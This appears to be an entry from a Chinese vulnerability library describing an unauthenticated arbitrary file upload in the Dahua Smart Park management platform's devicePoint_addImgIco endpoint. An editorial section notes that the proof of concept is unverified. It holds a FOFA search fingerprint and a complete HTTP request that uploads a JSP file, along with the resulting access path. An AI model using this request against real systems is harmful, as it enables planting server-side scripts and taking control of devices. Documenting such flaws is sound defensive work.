---
source: "wy876 漏洞文库"
id: "vw-8eaa1c2928b520d4789d1877"
entity_id: "ve-8eaa1c2928b520d4789d1877"
schema_version: "1"
fofa_unverified: "app=”dahua-智慧园区综合管理平台”"
title: "大华智慧园区综合管理平台devicePoint_addImgIco任意文件上传漏洞"
product: "大华智慧园区综合管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "hasSubsystem=true，无Cookie；8009上传/8314访问，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0devicePoint_addImgIco%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hfgy041afmv0g04c"
source_status: "recorded"
---

# 大华智慧园区综合管理平台devicePoint_addImgIco任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华智慧园区综合管理平台
- 本文讨论：devicePoint_addImgIco上传JSP扩展文件
- 版本、权限与配置前提：hasSubsystem=true，无Cookie；8009上传/8314访问，版本未知
- 资料类型：文件上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 上传内容123只能证明文件存储，不能证明JSP执行或服务器控制
- 输出随机重命名路径硬编码，无响应提取逻辑；两端口关系未解释
- FOFA使用弯引号会影响语法；缺修复/权限/版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- hasSubsystem认证语义、端口和目录解析待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 大华智慧园区综合管理平台存在文件上传漏洞，攻击者可以通过devicePoint_addImgIco接口任意上传文件，导致系统被攻击与控制。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ FOFA：`app=”dahua-智慧园区综合管理平台”`


+ 登陆页面：


# 四、漏洞复现
构造如下数据包：

```http
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Java/1.8.0_345
Host: 127.0.0.1:8009
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 223
Connection: close

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```


上传文件访问地址：`http://127.0.0.1:8314/upload/emap/society_new/ico_res_221b04b177b8_on.jsp`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hfgy041afmv0g04c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
